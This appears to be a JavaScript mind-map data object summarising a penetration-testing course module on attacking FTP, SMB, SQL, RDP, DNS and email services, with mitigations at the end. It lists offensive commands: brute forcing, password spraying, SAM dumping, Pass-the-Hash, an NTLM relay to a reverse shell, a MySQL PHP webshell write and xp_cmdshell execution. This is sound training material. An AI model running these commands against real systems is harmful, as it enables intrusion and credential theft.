    const data = {"content":"Attacking Common Services","children":[{"content":"&#x1f3af; Main Idea","children":[{"content":"Attack the network services most commonly exposed in enterprises: FTP, SMB, SQL (MSSQL/MySQL), RDP, DNS, and email (SMTP/POP3/IMAP).","children":[],"payload":{"tag":"li","lines":"2,3"}},{"content":"For each service: interact with it, find misconfigurations / excessive privileges / known vulnerabilities, harvest sensitive info and credentials, move laterally, and reach remote code execution.","children":[],"payload":{"tag":"li","lines":"3,4"}},{"content":"Uses a reusable &quot;Concept of Attacks&quot; model &#x2014; Source &#x2192; Process &#x2192; Privileges &#x2192; Destination &#x2014; to analyze any vulnerability or CVE.","children":[],"payload":{"tag":"li","lines":"4,6"}}],"payload":{"tag":"h2","lines":"1,2"}},{"content":"&#x1f4a5; Attack / Exploit Vectors","children":[{"content":"Foundations: Interacting, Attack Concept &amp; Misconfigurations","children":[{"content":"Interact via CLI/GUI clients; apply the Source&#x2192;Process&#x2192;Privileges&#x2192;Destination model (e.g. Log4Shell CVE-2021-44228 JNDI &#x2192; RCE).","children":[],"payload":{"tag":"li","lines":"8,9"}},{"content":"Hunt misconfigurations: default/weak/blank creds, anonymous auth, misconfigured access rights, unnecessary enabled features (OWASP A05).","children":[],"payload":{"tag":"li","lines":"9,10"}},{"content":"Chain low-value info across services (FTP &#x2192; email &#x2192; DB creds &#x2192; RCE); search shares for cred/password/key/secret files.","children":[],"payload":{"tag":"li","lines":"10,12"}}],"payload":{"tag":"h3","lines":"7,8"}},{"content":"Attacking FTP (TCP/21)","children":[{"content":"Anonymous auth, credential brute force, and FTP Bounce to reach internal hosts.","children":[],"payload":{"tag":"li","lines":"13,14"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>nmap -sC -sV -p21 &lt;ip&gt;<\/code> &#x2014; Enumerate FTP (ftp-anon, banner/version).","children":[],"payload":{"tag":"li","lines":"15,16"}},{"content":"<code>ftp 192.168.2.142<\/code> &#x2014; Connect with the ftp client.","children":[],"payload":{"tag":"li","lines":"16,17"}},{"content":"<code>nc -v 192.168.2.142 21<\/code> &#x2014; Connect with netcat.","children":[],"payload":{"tag":"li","lines":"17,18"}},{"content":"<code>hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142<\/code> &#x2014; Brute force FTP.","children":[],"payload":{"tag":"li","lines":"18,19"}},{"content":"<code>nmap -b anonymous:password@FTP_IP internal_IP<\/code> &#x2014; FTP Bounce scan of an internal host.","children":[],"payload":{"tag":"li","lines":"19,20"}}],"payload":{"tag":"li","lines":"14,20"}},{"content":"Latest: CoreFTP &lt; build 727 &#x2014; CVE-2022-22836, authenticated path traversal + arbitrary file write (malformed HTTP PUT).","children":[],"payload":{"tag":"li","lines":"20,22"}}],"payload":{"tag":"h3","lines":"12,13"}},{"content":"Attacking SMB (139/445)","children":[{"content":"Null sessions, brute/spray, RCE, SAM dumping, Pass-the-Hash, forced auth and NTLM relay.","children":[],"payload":{"tag":"li","lines":"23,24"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>smbclient -N -L //10.129.14.128<\/code> &#x2014; Null-session share listing.","children":[],"payload":{"tag":"li","lines":"25,26"}},{"content":"<code>smbmap -H 10.129.14.128<\/code> / <code>-r notes<\/code> &#x2014; Enumerate (recursive) shares with permissions.","children":[],"payload":{"tag":"li","lines":"26,27"}},{"content":"<code>smbmap -H 10.129.14.128 --download &quot;notes\\note.txt&quot;<\/code> / <code>--upload test.txt &quot;notes\\test.txt&quot;<\/code> &#x2014; Download/upload.","children":[],"payload":{"tag":"li","lines":"27,28"}},{"content":"<code>rpcclient -U&apos;%&apos; 10.10.110.17<\/code> &#x2014; Null session over rpcclient (enumdomusers, change passwords).","children":[],"payload":{"tag":"li","lines":"28,29"}},{"content":"<code>./enum4linux-ng.py 10.10.11.45 -A -C<\/code> &#x2014; Automated SMB enumeration.","children":[],"payload":{"tag":"li","lines":"29,30"}},{"content":"<code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &apos;Company01!&apos;<\/code> &#x2014; Password spraying.","children":[],"payload":{"tag":"li","lines":"30,31"}},{"content":"<code>impacket-psexec administrator:&apos;Password123!&apos;@10.10.110.17<\/code> &#x2014; RCE via psexec.","children":[],"payload":{"tag":"li","lines":"31,32"}},{"content":"<code>crackmapexec smb 10.10.110.17 -u Administrator -p &apos;Password123!&apos; -x &apos;whoami&apos; --exec-method smbexec<\/code> &#x2014; Command execution.","children":[],"payload":{"tag":"li","lines":"32,33"}},{"content":"<code>crackmapexec smb 10.10.110.0/24 -u administrator -p &apos;Password123!&apos; --loggedon-users<\/code> &#x2014; Enumerate logged-on users.","children":[],"payload":{"tag":"li","lines":"33,34"}},{"content":"<code>crackmapexec smb 10.10.110.17 -u administrator -p &apos;Password123!&apos; --sam<\/code> &#x2014; Dump SAM hashes.","children":[],"payload":{"tag":"li","lines":"34,35"}},{"content":"<code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE<\/code> &#x2014; Pass-the-Hash.","children":[],"payload":{"tag":"li","lines":"35,36"}},{"content":"<code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146<\/code> &#x2014; NTLM relay to dump SAM.","children":[],"payload":{"tag":"li","lines":"36,37"}},{"content":"<code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &apos;powershell -e &lt;b64 revshell&gt;&apos;<\/code> &#x2014; Relay to reverse shell.","children":[],"payload":{"tag":"li","lines":"37,38"}}],"payload":{"tag":"li","lines":"24,38"}},{"content":"Forced auth: Responder poisons LLMNR/NBT-NS/MDNS to capture NetNTLMv2 hashes (crack with <code>hashcat -m 5600<\/code>).","children":[],"payload":{"tag":"li","lines":"38,39"}},{"content":"Latest: SMBGhost &#x2014; CVE-2020-0796, SMBv3.1.1 compression integer overflow, unauthenticated RCE.","children":[],"payload":{"tag":"li","lines":"39,41"}}],"payload":{"tag":"h3","lines":"22,23"}},{"content":"Attacking SQL Databases (MSSQL 1433, MySQL 3306)","children":[{"content":"Connect, enumerate, execute OS commands, read/write files, steal service hashes, impersonate, and pivot via linked servers.","children":[],"payload":{"tag":"li","lines":"42,43"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>mysql -u julio -pPassword123 -h 10.129.20.13<\/code> &#x2014; Connect to MySQL.","children":[],"payload":{"tag":"li","lines":"44,45"}},{"content":"<code>sqlcmd -S SRVMSSQL\\SQLEXPRESS -U julio -P &apos;MyPassword!&apos; -y 30 -Y 30<\/code> &#x2014; Connect to MSSQL.","children":[],"payload":{"tag":"li","lines":"45,46"}},{"content":"<code>sqsh -S 10.129.203.7 -U julio -P &apos;MyPassword!&apos; -h<\/code> (or <code>-U .\\\\julio<\/code> for Windows auth) &#x2014; MSSQL from Linux.","children":[],"payload":{"tag":"li","lines":"46,47"}},{"content":"<code>SHOW DATABASES; USE htbusers; SHOW TABLES; SELECT * FROM users;<\/code> &#x2014; MySQL enumeration.","children":[],"payload":{"tag":"li","lines":"47,48"}},{"content":"<code>SELECT name FROM master.dbo.sysdatabases<\/code> / <code>SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES<\/code> &#x2014; MSSQL enumeration.","children":[],"payload":{"tag":"li","lines":"48,49"}},{"content":"<code>EXECUTE sp_configure &apos;show advanced options&apos;, 1<\/code> &#x2192; <code>EXECUTE sp_configure &apos;xp_cmdshell&apos;, 1<\/code> &#x2192; <code>RECONFIGURE<\/code> &#x2014; Enable xp_cmdshell.","children":[],"payload":{"tag":"li","lines":"49,50"}},{"content":"<code>xp_cmdshell &apos;whoami&apos;<\/code> &#x2014; Execute an OS command from MSSQL.","children":[],"payload":{"tag":"li","lines":"50,51"}},{"content":"<code>SELECT &quot;&lt;?php echo shell_exec(&#x24;_GET[&apos;c&apos;]);?&gt;&quot; INTO OUTFILE &apos;/var/www/html/webshell.php&apos;<\/code> &#x2014; MySQL file write (webshell).","children":[],"payload":{"tag":"li","lines":"51,52"}},{"content":"<code>show variables like &quot;secure_file_priv&quot;;<\/code> &#x2014; Check MySQL file-write privilege.","children":[],"payload":{"tag":"li","lines":"52,53"}},{"content":"<code>SELECT * FROM OPENROWSET(BULK N&apos;C:/Windows/System32/drivers/etc/hosts&apos;, SINGLE_CLOB) AS Contents<\/code> &#x2014; MSSQL file read.","children":[],"payload":{"tag":"li","lines":"53,54"}},{"content":"<code>select LOAD_FILE(&quot;/etc/passwd&quot;);<\/code> &#x2014; MySQL file read.","children":[],"payload":{"tag":"li","lines":"54,55"}},{"content":"<code>EXEC master..xp_dirtree &apos;\\\\10.10.110.17\\share\\&apos;<\/code> / <code>xp_subdirs<\/code> &#x2014; Steal MSSQL service NetNTLMv2 hash via SMB.","children":[],"payload":{"tag":"li","lines":"55,56"}},{"content":"<code>SELECT srvname, isremote FROM sysservers<\/code> &#x2014; Identify linked servers.","children":[],"payload":{"tag":"li","lines":"56,57"}},{"content":"<code>EXECUTE(&apos;select @@servername, ... is_srvrolemember(&apos;&apos;sysadmin&apos;&apos;)&apos;) AT [10.0.0.12\\SQLEXPRESS]<\/code> &#x2014; Query a linked server.","children":[],"payload":{"tag":"li","lines":"57,58"}}],"payload":{"tag":"li","lines":"43,58"}},{"content":"Also: <code>EXECUTE AS LOGIN = &apos;sa&apos;<\/code> impersonation; MySQL CVE-2012-2122 auth bypass.","children":[],"payload":{"tag":"li","lines":"58,59"}},{"content":"Latest: xp_dirtree SMB hash leak of the MSSQL service account (no CVE) for relay/offline cracking.","children":[],"payload":{"tag":"li","lines":"59,61"}}],"payload":{"tag":"h3","lines":"41,42"}},{"content":"Attacking RDP (TCP/3389)","children":[{"content":"Password spraying/guessing, session hijacking, and Pass-the-Hash.","children":[],"payload":{"tag":"li","lines":"62,63"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c &apos;password123&apos;<\/code> &#x2014; Password spraying.","children":[],"payload":{"tag":"li","lines":"64,65"}},{"content":"<code>hydra -L usernames.txt -p &apos;password123&apos; 192.168.2.143 rdp<\/code> &#x2014; Brute force RDP.","children":[],"payload":{"tag":"li","lines":"65,66"}},{"content":"<code>rdesktop -u admin -p password123 192.168.2.143<\/code> &#x2014; Connect via rdesktop.","children":[],"payload":{"tag":"li","lines":"66,67"}},{"content":"<code>tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}<\/code> + <code>net start sessionhijack<\/code> &#x2014; Hijack a session (as SYSTEM).","children":[],"payload":{"tag":"li","lines":"67,68"}},{"content":"<code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f<\/code> &#x2014; Enable Restricted Admin Mode.","children":[],"payload":{"tag":"li","lines":"68,69"}},{"content":"<code>xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA<\/code> &#x2014; RDP Pass-the-Hash.","children":[],"payload":{"tag":"li","lines":"69,70"}}],"payload":{"tag":"li","lines":"63,70"}},{"content":"Latest: BlueKeep &#x2014; CVE-2019-0708, pre-auth RDP use-after-free RCE as LocalSystem (risk of BSoD).","children":[],"payload":{"tag":"li","lines":"70,72"}}],"payload":{"tag":"h3","lines":"61,62"}},{"content":"Attacking DNS (UDP/TCP 53)","children":[{"content":"Zone transfer, subdomain enumeration, subdomain takeover, and spoofing/cache poisoning.","children":[],"payload":{"tag":"li","lines":"73,74"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>dig AXFR @ns1.inlanefreight.htb inlanefreight.htb<\/code> &#x2014; Attempt a zone transfer (AXFR).","children":[],"payload":{"tag":"li","lines":"75,76"}},{"content":"<code>subfinder -d inlanefreight.com -v<\/code> &#x2014; Enumerate subdomains.","children":[],"payload":{"tag":"li","lines":"76,77"}},{"content":"<code>host support.inlanefreight.com<\/code> &#x2014; DNS lookup of a subdomain.","children":[],"payload":{"tag":"li","lines":"77,78"}}],"payload":{"tag":"li","lines":"74,78"}},{"content":"Also: Fierce/Sublist3r/Subbrute (subdomain enum); Ettercap/Bettercap (DNS spoof/cache poison); can-i-take-over-xyz reference.","children":[],"payload":{"tag":"li","lines":"78,79"}},{"content":"Latest: Subdomain Takeover &#x2014; dangling CNAME to an unclaimed third-party resource.","children":[],"payload":{"tag":"li","lines":"79,81"}}],"payload":{"tag":"h3","lines":"72,73"}},{"content":"Attacking Email Services (SMTP 25/465/587, POP3 110/995, IMAP 143/993)","children":[{"content":"Find mail servers, enumerate users, spray/brute force, and abuse open relay.","children":[],"payload":{"tag":"li","lines":"82,83"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>host -t MX microsoft.com<\/code> / <code>dig mx inlanefreight.com | grep &quot;MX&quot; | grep -v &quot;;&quot;<\/code> &#x2014; Find mail servers.","children":[],"payload":{"tag":"li","lines":"84,85"}},{"content":"<code>host -t A mail1.inlanefreight.htb.<\/code> &#x2014; Resolve a mail host.","children":[],"payload":{"tag":"li","lines":"85,86"}},{"content":"<code>telnet 10.10.110.20 25<\/code> &#x2014; Connect to SMTP (VRFY/EXPN/RCPT enumeration).","children":[],"payload":{"tag":"li","lines":"86,87"}},{"content":"<code>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7<\/code> &#x2014; SMTP user enumeration.","children":[],"payload":{"tag":"li","lines":"87,88"}},{"content":"<code>python3 o365spray.py --validate --domain msplaintext.xyz<\/code> &#x2014; Verify Office365 usage.","children":[],"payload":{"tag":"li","lines":"88,89"}},{"content":"<code>python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz<\/code> &#x2014; Enumerate O365 users.","children":[],"payload":{"tag":"li","lines":"89,90"}},{"content":"<code>python3 o365spray.py --spray -U usersfound.txt -p &apos;March2022!&apos; --count 1 --lockout 1 --domain msplaintext.xyz<\/code> &#x2014; Password spray O365.","children":[],"payload":{"tag":"li","lines":"90,91"}},{"content":"<code>hydra -L users.txt -p &apos;Company01!&apos; -f 10.10.110.20 pop3<\/code> &#x2014; Brute force POP3.","children":[],"payload":{"tag":"li","lines":"91,92"}},{"content":"<code>swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &apos;Subject: Notification&apos; --body &apos;Message&apos; --server 10.10.11.213<\/code> &#x2014; Test/abuse open relay.","children":[],"payload":{"tag":"li","lines":"92,93"}}],"payload":{"tag":"li","lines":"83,93"}},{"content":"Latest: OpenSMTPD &lt;= 6.6.2 &#x2014; CVE-2020-7247, unauthenticated RCE via <code>;<\/code> in MAIL FROM (runs as root).","children":[],"payload":{"tag":"li","lines":"93,95"}}],"payload":{"tag":"h3","lines":"81,82"}}],"payload":{"tag":"h2","lines":"6,7"}},{"content":"&#x1f6e0;&#xfe0f; Key Tools &amp; Concepts","children":[{"content":"smbclient / smbmap / rpcclient / enum4linux-ng &#x2014; SMB enumeration and null sessions.","children":[],"payload":{"tag":"li","lines":"96,97"}},{"content":"CrackMapExec (CME) &#x2014; SMB spraying, RCE, SAM dump, PtH, logged-on users.","children":[],"payload":{"tag":"li","lines":"97,98"}},{"content":"Impacket (psexec, smbexec, atexec, mssqlclient, ntlmrelayx, smbserver) &#x2014; RCE, SQL, relay, hash capture.","children":[],"payload":{"tag":"li","lines":"98,99"}},{"content":"Responder &#x2014; LLMNR/NBT-NS/MDNS poisoner to steal NetNTLM hashes; hashcat <code>-m 5600<\/code> to crack.","children":[],"payload":{"tag":"li","lines":"99,100"}},{"content":"Medusa / Hydra / Crowbar &#x2014; brute force / password spraying (FTP, RDP, email).","children":[],"payload":{"tag":"li","lines":"100,101"}},{"content":"sqsh / sqlcmd / mysql / mssqlclient &#x2014; SQL clients; xp_cmdshell / xp_dirtree &#x2014; MSSQL RCE and hash theft.","children":[],"payload":{"tag":"li","lines":"101,102"}},{"content":"rdesktop / xfreerdp &#x2014; RDP clients; tscon.exe / sc.exe &#x2014; session hijacking and SYSTEM service creation.","children":[],"payload":{"tag":"li","lines":"102,103"}},{"content":"dig / host / fierce / subfinder &#x2014; DNS querying, zone transfer, subdomain enum.","children":[],"payload":{"tag":"li","lines":"103,104"}},{"content":"Ettercap / Bettercap &#x2014; MITM DNS spoofing; can-i-take-over-xyz &#x2014; takeover reference.","children":[],"payload":{"tag":"li","lines":"104,105"}},{"content":"smtp-user-enum / O365spray / swaks &#x2014; email user enum, spray, open-relay abuse.","children":[],"payload":{"tag":"li","lines":"105,106"}},{"content":"Concepts: Source&#x2192;Process&#x2192;Privileges&#x2192;Destination, Pass-the-Hash, SMB/NTLM relay, password spraying, null session, open relay, subdomain takeover.","children":[],"payload":{"tag":"li","lines":"106,108"}}],"payload":{"tag":"h2","lines":"95,96"}},{"content":"&#x1f6e1;&#xfe0f; Mitigations","children":[{"content":"Change default credentials, enforce strong password policies, disable admin/debug interfaces, prevent directory listing.","children":[],"payload":{"tag":"li","lines":"109,110"}},{"content":"Repeatable hardening, minimal platform (remove unused features/samples), patch management, segmentation (ACLs), security headers, review cloud storage (S3) permissions.","children":[],"payload":{"tag":"li","lines":"110,111"}},{"content":"Apply least privilege / RBAC; keep patched for SMBGhost (CVE-2020-0796) and BlueKeep (CVE-2019-0708).","children":[],"payload":{"tag":"li","lines":"111,112"}},{"content":"DNS: restrict who can perform zone transfers; delete CNAME records when third-party services are decommissioned.","children":[],"payload":{"tag":"li","lines":"112,113"}},{"content":"Email: disable VRFY/EXPN, do not run as an open relay, keep OpenSMTPD patched.","children":[],"payload":{"tag":"li","lines":"113,114"}}],"payload":{"tag":"h2","lines":"108,109"}}],"payload":{"tag":"h1","lines":"0,1"}}
